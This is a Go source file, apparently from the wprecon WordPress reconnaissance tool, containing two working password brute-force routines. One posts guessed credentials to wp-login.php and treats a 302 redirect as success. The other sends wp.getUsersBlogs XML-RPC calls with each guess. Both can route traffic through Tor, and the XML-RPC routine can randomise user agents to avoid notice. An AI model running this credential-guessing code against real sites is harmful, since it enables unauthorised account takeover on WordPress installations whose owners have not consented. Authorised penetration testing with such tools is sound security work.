package fuzzing

import (
	"fmt"
	httplib "net/http"
	"net/url"

	"github.com/blackbinn/wprecon/internal/database"
	"github.com/blackbinn/wprecon/internal/pkg/gohttp"
	"github.com/blackbinn/wprecon/internal/pkg/printer"
)

func WPLogin(channel chan [3]string, username string, passwords []string) {
	var prefix = database.Memory.GetString("Passwords Prefix")
	var suffix = database.Memory.GetString("Passwords Suffix")

	for _, password := range passwords {
		var http = gohttp.NewHTTPClient().
			SetMethod("POST").
			SetURL(database.Memory.GetString("Target")).
			SetURLDirectory("wp-login.php").
			SetContentType("application/x-www-form-urlencoded").
			SetForm(&url.Values{"log": {username}, "pwd": {prefix + password + suffix}})

		http.OnTor(database.Memory.GetBool("HTTP Options TOR"))
		http.SetRedirectFunc(func(response *httplib.Request, via []*httplib.Request) error {
			if status := response.Response.StatusCode; status == 302 {
				channel <- [3]string{fmt.Sprint(status), username, password}
			}
			return nil
		})

		var response, err = http.Run()

		if err != nil {
			printer.Fatal(err)
		}

		channel <- [3]string{fmt.Sprint(response.Response.StatusCode), username, password}
	}
}

func XMLRPC(channel chan [3]string, username string, passwords []string) {
	var pprefix = database.Memory.GetString("Passwords Prefix")
	var psuffix = database.Memory.GetString("Passwords Suffix")

	for _, password := range passwords {
		var http = gohttp.NewHTTPClient().
			SetMethod("POST").
			SetURL(database.Memory.GetString("Target")).
			SetURLDirectory("xmlrpc.php").
			OnRandomUserAgent(database.Memory.GetBool("HTTP Options Random Agent")).
			OnTLSCertificateVerify(database.Memory.GetBool("HTTP Options TLS Certificate Verify")).
			FirewallDetection(true)
		http.OnTor(database.Memory.GetBool("HTTP Options TOR"))
		http.SetData(fmt.Sprintf(`<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>`, username, pprefix+password+psuffix))

		var response, err = http.Run()

		if err != nil {
			printer.Danger(fmt.Sprintf("%s", err))
		}

		channel <- [3]string{fmt.Sprint(response.Raw), username, password}
	}
}
